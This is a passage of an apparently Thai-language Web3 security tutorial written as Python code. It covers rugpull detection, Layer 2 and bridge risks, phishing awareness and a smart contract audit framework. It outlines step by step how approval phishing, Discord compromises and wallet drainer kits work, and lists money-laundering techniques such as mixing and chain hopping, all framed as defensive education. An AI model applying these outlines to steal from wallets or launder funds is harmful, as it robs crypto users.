            attribution_methods=[
                "On-chain clustering (co-spending analysis)",
                "Exchange deposit address linking",
                "IP address from MEV opportunities",
                "Social media/forum post correlation",
                "Gas price patterns and timing analysis",
            ]
        ),
        ForensicsCase(
            case_id="CASE-002",
            incident_type=InvestigationType.RUGPULL,
            description_th="วิเคราะห์ Rugpull - team สร้าง liquidity แล้วถอน",
            affected_amount="$1M+",
            investigation_steps=[
                "1. ตรวจสอบ token contract source code",
                "2. หา honeypot functions (block sells, high tax)",
                "3. วิเคราะห์ LP token ownership",
                "4. ตรวจสอบ deployer address history",
                "5. ใช้ Dune Analytics หา LP withdrawal timing",
            ],
            tools_used=["Rugpull Detector", "Etherscan", "Honeypot.is", "Token Sniffer"],
            attribution_methods=[
                "Deployer address KYC via exchanges",
                "Social media presence correlation",
                "Domain registration data",
                "Previous similar patterns from same deployer",
            ]
        ),
    ]

    RUGPULL_DETECTION = """
import requests
import json

class RugpullDetector:
    def __init__(self, etherscan_api_key: str):
        self.api_key = etherscan_api_key
        self.base = "https://api.etherscan.io/api"
    
    def check_contract_flags(self, contract_address: str) -> dict:
        flags = {
            'mint_function': False,
            'blacklist_function': False,
            'fee_changer': False,
            'trading_control': False,
            'proxy_upgrade': False,
            'lp_locked': False,
        }
        
        # Get contract ABI
        r = requests.get(self.base, params={
            'module': 'contract', 'action': 'getabi',
            'address': contract_address, 'apikey': self.api_key
        })
        
        if r.status_code == 200:
            data = r.json()
            if data.get('result'):
                abi = json.loads(data['result'])
                function_names = [f.get('name', '').lower() for f in abi if f.get('type') == 'function']
                
                # Check for dangerous functions
                flags['mint_function'] = any('mint' in fn for fn in function_names)
                flags['blacklist_function'] = any('blacklist' in fn or 'ban' in fn for fn in function_names)
                flags['fee_changer'] = any('setfee' in fn or 'updatefee' in fn for fn in function_names)
                flags['trading_control'] = any('enabletrading' in fn or 'settrading' in fn for fn in function_names)
        
        return flags
    
    def check_lp_lock(self, lp_token_address: str, owner_address: str) -> dict:
        # Check if LP tokens are locked in a locker contract
        known_lockers = [
            '0x663A5C229c09b049E36dFd11B5E4e72858f9C8c0',  # Unicrypt
            '0x71B5759d73262FBb223956913ecF4ecC51057641',  # PinkLock
        ]
        # Check balance of owner vs locker contracts
        return {'locked': False, 'locker': None, 'percentage': 0}
"""

    MONEY_LAUNDERING_PATTERNS = {
        "layering": "โอนเงินผ่านหลายเลเยอร์",
        "mixing": "ใช้ Tornado Cash หรือ ChipMixer",
        "chain_hop": "โอนข้าม chains ผ่าน bridges",
        "smurfing": "แตก transaction เป็นจำนวนเล็กๆ",
        "exchange_peeling": "ฝากผ่าน exchanges ผู้ปิดสังเกต",
    }

    @classmethod
    def generate_investigation_playbook(cls) -> str:
        lines = ["# Blockchain Investigation Playbook\n"]
        for case in cls.INVESTIGATION_FRAMEWORKS:
            lines.append(f"## Case Type: {case.incident_type.value}")
            lines.append(f"Amount: {case.affected_amount}")
            lines.append(f"Description: {case.description_th}")
            lines.append("\nInvestigation Steps:")
            for step in case.investigation_steps:
                lines.append(f"  {step}")
            lines.append("\nTools:")
            for tool in case.tools_used:
                lines.append(f"  - {tool}")
            lines.append("\nAttribution Methods:")
            for method in case.attribution_methods:
                lines.append(f"  - {method}")
            lines.append("")
        return "\n".join(lines)

# ตัวอย่างการใช้งาน
bi = BlockchainInvestigator()
print(BlockchainInvestigator.generate_investigation_playbook())
```

---

## Step 988: Layer 2 & Cross-Chain Security

```python
from dataclasses import dataclass
from typing import List, Dict
from enum import Enum

class L2Type(Enum):
    OPTIMISTIC_ROLLUP = "optimistic_rollup"
    ZK_ROLLUP = "zk_rollup"
    VALIDIUM = "validium"
    PLASMA = "plasma"
    STATE_CHANNEL = "state_channel"

@dataclass
class L2SecurityIssue:
    """ปัญหาความปลอดภัย Layer 2"""
    l2_type: L2Type
    issue: str
    description_th: str
    affected_networks: List[str]
    mitigation: str
    severity: str

class L2SecurityAnalyzer:
    """วิเคราะห์ความปลอดภัย Layer 2 และ Bridge"""

    SECURITY_ISSUES: List[L2SecurityIssue] = [
        L2SecurityIssue(
            l2_type=L2Type.OPTIMISTIC_ROLLUP,
            issue="Fraud Proof Window Griefing",
            description_th="ผู้โจมตีสามารถทำให้การ fraud challenge ล้มเหลว",
            affected_networks=["Optimism", "Arbitrum", "Base"],
            mitigation="Multiple challengers, high bonding requirements",
            severity="medium"
        ),
        L2SecurityIssue(
            l2_type=L2Type.ZK_ROLLUP,
            issue="Trusted Setup Ceremony Risk",
            description_th="ถ้า trusted setup ถูกแทรก prover สามารถสร้าง fake proofs",
            affected_networks=["Groth16 based systems"],
            mitigation="Use PLONK/STARKs (universal or transparent setup)",
            severity="critical"
        ),
        L2SecurityIssue(
            l2_type=L2Type.ZK_ROLLUP,
            issue="Circuit Implementation Bugs",
            description_th="ข้อผิดพลาดใน ZK circuit สามารถแอบปลอมได้",
            affected_networks=["zkSync", "StarkNet", "Polygon zkEVM"],
            mitigation="Formal verification, multiple audits, bug bounties",
            severity="critical"
        ),
    ]

    BRIDGE_SECURITY_CHECKLIST = """
# Cross-Chain Bridge Security Checklist

## Validator Security
- [ ] Multi-sig or threshold signatures (not single point of failure)
- [ ] Validators are geographically distributed
- [ ] Private keys in HSM or MPC
- [ ] Validator monitoring and alerting

## Smart Contract Security
- [ ] Full audit by multiple firms
- [ ] Bug bounty program active
- [ ] Formal verification for critical paths
- [ ] Emergency pause mechanism

## Risk Limits
- [ ] Daily withdrawal limits
- [ ] Large withdrawal delays/reviews
- [ ] Circuit breakers for anomalous activity

## Monitoring
- [ ] 24/7 monitoring of bridge contracts
- [ ] Alert on unusual outflows
- [ ] Forta bots for exploit detection
"""

    L2_COMPARISON_TABLE = [
        {"name": "Arbitrum One", "type": "Optimistic Rollup", "tps": "40,000", "withdrawal": "7 days", "security": "High"},
        {"name": "Optimism", "type": "Optimistic Rollup", "tps": "2,000", "withdrawal": "7 days", "security": "High"},
        {"name": "zkSync Era", "type": "ZK Rollup", "tps": "100,000", "withdrawal": "Hours", "security": "Very High"},
        {"name": "StarkNet", "type": "ZK Rollup", "tps": "9,000", "withdrawal": "Hours", "security": "Very High"},
        {"name": "Polygon zkEVM", "type": "ZK EVM", "tps": "2,000", "withdrawal": "Minutes", "security": "High"},
    ]

    @classmethod
    def generate_l2_security_report(cls) -> str:
        lines = ["# Layer 2 Security Report\n"]
        lines.append("## Known Security Issues")
        for issue in cls.SECURITY_ISSUES:
            lines.append(f"\n### [{issue.severity.upper()}] {issue.issue}")
            lines.append(f"Type: {issue.l2_type.value}")
            lines.append(f"Description: {issue.description_th}")
            lines.append(f"Affects: {', '.join(issue.affected_networks)}")
            lines.append(f"Mitigation: {issue.mitigation}")
        
        lines.append("\n## L2 Comparison")
        headers = ["Name", "Type", "TPS", "Withdrawal", "Security"]
        lines.append("| " + " | ".join(headers) + " |")
        lines.append("|" + "---|" * len(headers))
        for l2 in cls.L2_COMPARISON_TABLE:
            lines.append(f"| {l2['name']} | {l2['type']} | {l2['tps']} | {l2['withdrawal']} | {l2['security']} |")
        return "\n".join(lines)

# ตัวอย่างการใช้งาน
l2 = L2SecurityAnalyzer()
print(L2SecurityAnalyzer.generate_l2_security_report())
print("\n### Bridge Security Checklist:")
print(l2.BRIDGE_SECURITY_CHECKLIST)
```

---

## Step 989: Web3 Phishing & Social Engineering

```python
from dataclasses import dataclass
from typing import List, Dict
from enum import Enum

class Web3PhishingType(Enum):
    APPROVAL_PHISHING = "approval_phishing"
    FAKE_AIRDROP = "fake_airdrop"
    IMPERSONATION = "impersonation"
    MALICIOUS_NFT = "malicious_nft"
    FAKE_MINT = "fake_mint_site"
    DISCORD_HACK = "discord_hack"
    DRAINER = "wallet_drainer"

@dataclass
class Web3PhishingAttack:
    """การโจมตี Web3 Phishing"""
    attack_type: Web3PhishingType
    name: str
    description_th: str
    mechanism: str
    indicators: List[str]
    protection: List[str]
    real_examples: List[str]

class Web3PhishingAnalyzer:
    """วิเคราะห์ Web3 Phishing Attacks"""

    ATTACKS: List[Web3PhishingAttack] = [
        Web3PhishingAttack(
            attack_type=Web3PhishingType.APPROVAL_PHISHING,
            name="NFT/Token Approval Phishing",
            description_th="หลอให้ approve token allowance แก่ malicious contract แล้วดึงออก",
            mechanism="""
1. Create fake popular protocol website (Opensea, Uniswap clone)
2. Request setApprovalForAll() or approve() with huge allowance
3. User approves thinking it's legitimate
4. Drain all tokens/NFTs immediately""",
            indicators=[
                "Domain is slightly different from official (0pensea.io, opensea.app)",
                "Wallet requests unusual approve() for entire balance",
                "Unknown contract address in transaction",
                "Unsolicited DM with 'exclusive' opportunity",
            ],
            protection=[
                "Always verify domain URL carefully",
                "Use revoke.cash to check and revoke approvals",
                "Limit approval amounts (not unlimited)",
                "Use hardware wallet",
                "Check contract address on Etherscan before approving",
            ],
            real_examples=[
                "$80M stolen from Bored Ape holders via fake Otherside mint",
                "Multiple celebrity Twitter hacks promoting fake NFT airdrops",
            ]
        ),
        Web3PhishingAttack(
            attack_type=Web3PhishingType.DISCORD_HACK,
            name="Discord Server Compromise",
            description_th="แฮ็ค Discord เพื่อส่ง malicious mint links แก่ NFT community",
            mechanism="""
1. Compromise Discord admin/bot account (phishing, token theft)
2. Post malicious 'exclusive mint' announcement
3. Pin message and delete legitimate ones
4. Users rush to mint, get drained""",
            indicators=[
                "Urgent announcements from admin accounts",
                "Links to unfamiliar domains",
                "Requests to connect wallet to unfamiliar site",
                "Too good to be true offers",
            ],
            protection=[
                "Verify mint links through official Twitter/website",
                "Never rush - legitimate projects don't have 5-minute windows",
                "Check domain age and SSL certificate",
                "Use separate burner wallet for minting",
            ],
            real_examples=[
                "Yuga Labs Discord hack: $360K stolen",
                "Premint.xyz hack: $375K stolen via malicious script",
            ]
        ),
        Web3PhishingAttack(
            attack_type=Web3PhishingType.DRAINER,
            name="Wallet Drainer Kits",
            description_th="Drainer-as-a-Service: phishing kit สำเร็จรูปสำหรับ phisher ใช้",
            mechanism="""
1. Drainer dev creates kit with UI, smart contracts, backend
2. Rents/sells to phishers for 20-30% fee
3. Phisher creates fake sites using the kit
4. Drainer identifies most valuable assets and drains atomically
5. Pink Drainer, Inferno Drainer, Venom Drainer are known kits""",
            indicators=[
                "Multiple approvals requested in single transaction",
                "Permit2 signature requested for unknown contract",
                "'signTypedData' request for unfamiliar protocol",
            ],
            protection=[
                "Never sign messages you don't understand",
                "Use Revoke.cash before and after suspicious interactions",
                "EIP-7265 circuit breaker proposal",
                "Use hardware wallet (can see full TX details)",
            ],
            real_examples=[
                "Pink Drainer: $75M+ stolen across 2023",
                "Inferno Drainer: $80M across 6 months",
            ]
        ),
    ]

    SECURITY_BEST_PRACTICES = {
        "seed_phrase": "ไม่บอก seed phrase ใครทั้งสิ้น - ไม่มี website ใดต้องการ seed phrase ของคุณ",
        "hardware_wallet": "ใช้ hardware wallet สำหรับ high-value assets เสมอ",
        "burner_wallet": "ใช้ burner wallet สำหรับ new mints และ experiments",
        "revoke_approvals": "ตรวจสอบและ revoke approvals ด้วย revoke.cash สม่ำเสมอ",
        "verify_domains": "ตรวจ URL ให้แน่ใจทุกครั้งก่อน connect wallet",
        "slow_down": "ไม่ใจร้อน - legitimate projects ไม่เคยบอกให้รีบ",
        "simulate_tx": "ใช้ Tenderly หรือ Pocket Universe simulate transaction ก่อน sign",
    }

    @classmethod
    def generate_phishing_awareness_guide(cls) -> str:
        lines = ["# Web3 Phishing Awareness Guide\n"]
        for attack in cls.ATTACKS:
            lines.append(f"## {attack.name} ({attack.attack_type.value})")
            lines.append(f"Description: {attack.description_th}")
            lines.append("\nIndicators:")
            for ind in attack.indicators:
                lines.append(f"  - {ind}")
            lines.append("\nProtection:")
            for prot in attack.protection:
                lines.append(f"  - {prot}")
            lines.append("\nReal Examples:")
            for ex in attack.real_examples:
                lines.append(f"  - {ex}")
            lines.append("")
        return "\n".join(lines)

# ตัวอย่างการใช้งาน
wpa = Web3PhishingAnalyzer()
print(Web3PhishingAnalyzer.generate_phishing_awareness_guide())

print("\n### Security Best Practices:")
for practice, desc in wpa.SECURITY_BEST_PRACTICES.items():
    print(f"  [{practice}]: {desc}")
```

---

## Step 990: Web3 Security Assessment Framework

```python
from dataclasses import dataclass, field
from typing import List, Dict
from enum import Enum
from datetime import datetime

class AssessmentType(Enum):
    SMART_CONTRACT_AUDIT = "smart_contract_audit"
    PROTOCOL_REVIEW = "protocol_review"
    DEFI_ASSESSMENT = "defi_assessment"
    WALLET_SECURITY = "wallet_security"
    BRIDGE_AUDIT = "bridge_audit"

@dataclass
class AuditFinding:
    """ผลการตรวจสอบ"""
    finding_id: str
    severity: str  # Critical/High/Medium/Low/Info
    title: str
    description_th: str
    location: str  # Contract:function
    impact: str
    recommendation: str
    status: str  # Open/Fixed/Acknowledged

class Web3SecurityAssessment:
    """กรอบการตรวจสอบความปลอดภัย Web3"""

    def __init__(self, project_name: str, assessment_type: AssessmentType):
        self.project_name = project_name
        self.assessment_type = assessment_type
        self.findings: List[AuditFinding] = []
        self.start_date = datetime.now()
        self.scope = []

    def add_finding(self, finding: AuditFinding):
        self.findings.append(finding)

    def get_findings_by_severity(self, severity: str) -> List[AuditFinding]:
        return [f for f in self.findings if f.severity.lower() == severity.lower()]

    def generate_audit_report(self) -> str:
        critical = self.get_findings_by_severity("Critical")
        high = self.get_findings_by_severity("High")
        medium = self.get_findings_by_severity("Medium")
        low = self.get_findings_by_severity("Low")

        report = [
            f"# Smart Contract Audit Report: {self.project_name}",
            f"Assessment Type: {self.assessment_type.value}",
            f"Date: {self.start_date.strftime('%Y-%m-%d')}",
            f"\n## Executive Summary",
            f"Total Findings: {len(self.findings)}",
            f"  Critical: {len(critical)}",
            f"  High: {len(high)}",
            f"  Medium: {len(medium)}",
            f"  Low: {len(low)}",
            "\n## Findings",
        ]
        for finding in self.findings:
            report.append(f"\n### [{finding.severity}] {finding.finding_id}: {finding.title}")
            report.append(f"**Location:** {finding.location}")
            report.append(f"**Description:** {finding.description_th}")
            report.append(f"**Impact:** {finding.impact}")
            report.append(f"**Recommendation:** {finding.recommendation}")
            report.append(f"**Status:** {finding.status}")
        return "\n".join(report)

    AUDIT_METHODOLOGY = {
        "phase_1_setup": [
            "Scope definition and contract identification",
            "Documentation review (whitepaper, docs)",
            "Dependency analysis",
            "Tool setup: Slither, Mythril, Echidna",
        ],
        "phase_2_manual_review": [
            "Access control review",
            "Business logic review",
            "Token economics analysis",
            "Math precision checks",
            "External call analysis",
            "Oracle dependencies",
        ],
        "phase_3_automated": [
            "Slither static analysis",
            "Mythril symbolic execution",
            "Echidna property-based fuzzing",
            "Semgrep custom rules",
            "Manticore advanced analysis",
        ],
        "phase_4_report": [
            "Draft findings with severity",
            "Proof of concept for critical findings",
            "Remediation recommendations",
            "Client review round",
            "Final report with fixes verified",
        ],
    }

    TOP_AUDIT_FIRMS = [
        {"firm": "Trail of Bits", "specialties": "Crypto, Ethereum, ZK, Formal Verification"},
        {"firm": "OpenZeppelin", "specialties": "ERC standards, DeFi, governance"},
        {"firm": "Consensys Diligence", "specialties": "Ethereum, DeFi"},
        {"firm": "Quantstamp", "specialties": "Automated + manual"},
        {"firm": "Certik", "specialties": "Formal verification, DeFi"},
        {"firm": "ChainSecurity", "specialties": "Academic rigorous"},
        {"firm": "Sherlock", "specialties": "Audit + coverage"},
    ]

# ตัวอย่างการใช้งาน
assessment = Web3SecurityAssessment(
    project_name="Example DeFi Protocol",
    assessment_type=AssessmentType.SMART_CONTRACT_AUDIT
)

# เพิ่ม findings
assessment.add_finding(AuditFinding(
    finding_id="SWC-107",
    severity="Critical",
    title="Reentrancy in withdraw()",
    description_th="ฟังก์ชัน withdraw() มีช่องโหว่ reentrancy",
    location="VaultContract:withdraw()",
    impact="ผู้โจมตีสามารถดึงเงินทั้งหมด",
    recommendation="ใช้ Checks-Effects-Interactions pattern และ ReentrancyGuard",
    status="Open"
))
assessment.add_finding(AuditFinding(
    finding_id="ACCESS-001",
    severity="High",
    title="Missing Access Control on setFee()",
    description_th="ฟังก์ชัน setFee() ไม่มี onlyOwner modifier",
    location="FeeManager:setFee()",
    impact="ใครก็แก้ fee ได้ อาจเป็น 100%",
    recommendation="เพิ่ม onlyOwner modifier",
    status="Fixed"
))

print(assessment.generate_audit_report())

print("\n### Audit Methodology:")
for phase, tasks in assessment.AUDIT_METHODOLOGY.items():
    print(f"\n#### {phase.replace('_', ' ').title()}:")
    for task in tasks:
        print(f"  - {task}")

print("\n### Top Audit Firms:")
for firm in assessment.TOP_AUDIT_FIRMS:
    print(f"  [{firm['firm']}]: {firm['specialties']}")
```

---

## สรุป Part 99

| Step | หัวข้อ | เครื่องมือ/เทคนิค |
|------|--------|-------------------|
| 981 | Smart Contract Audit | Reentrancy, overflow, Slither, Mythril, Echidna |
| 982 | DeFi Attacks | Flash loan, sandwich, governance, bridge exploits |
| 983 | Blockchain Forensics | Web3.py, Etherscan API, fund tracing |
| 984 | Wallet Security | Seed phrase, approval phishing, hardware wallets |
| 985 | NFT Security | Free mint bypass, approval phishing, ERC721 vulns |
| 986 | MEV Analysis | Sandwich, arbitrage, Flashbots integration |
| 987 | Blockchain Investigation | Rugpull detection, money laundering patterns |
| 988 | Layer 2 Security | Optimistic rollup, ZK rollup, bridge security |
| 989 | Web3 Phishing | Wallet drainers, Discord hacks, protection |
| 990 | Security Assessment | Full audit framework, methodology, report |
